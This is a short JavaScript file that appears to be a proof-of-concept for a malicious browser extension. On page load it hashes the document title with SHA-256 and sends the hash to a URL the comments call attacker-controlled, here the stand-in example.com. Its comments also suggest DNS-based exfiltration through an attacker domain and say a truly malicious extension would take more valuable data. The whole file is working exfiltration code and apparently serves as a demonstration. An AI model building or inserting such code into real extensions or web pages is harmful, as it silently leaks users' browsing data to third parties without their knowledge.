function exfil(str) {
    // take the provided string, SHA-256 hash it, then call an attacker-controlled URL with the hash included.
    // other options, if you could be bothered writing them, involve dns resolution of sha256(string).attackerdomain.com
    // and probably a thousand other methods. But this one is easy.
    var buffer = new TextEncoder("utf-8").encode(str);
    return crypto.subtle.digest("SHA-256", buffer).then(callUrl);
}

function callUrl(buffer) {
    // this function "exfiltrates" data by making a (404-returning) call to a webserver the attacker controls
    // except it's example.com so w/e
    var digest = hex(buffer);
    var url = "https://example.com/" + digest;
    console.log("Exfiltrating data to " + url)
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url, true);
    xmlHttp.send( null);
    return digest;
}

function hex(buffer) {
    // nicked from https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest
    var hexCodes = [];
    var view = new DataView(buffer);
    for (var i = 0; i < view.byteLength; i += 4) {
        var value = view.getUint32(i)
        var stringValue = value.toString(16)
        var padding = '00000000'
        var paddedValue = (padding + stringValue).slice(-padding.length)
        hexCodes.push(paddedValue);
    }
    var athing = hexCodes.join("");
    return hexCodes.join("");
}

// Obviously a really malicious extension would exfil more interesting stuff than the document title but we're MVP here.
var digest = exfil(document.title);
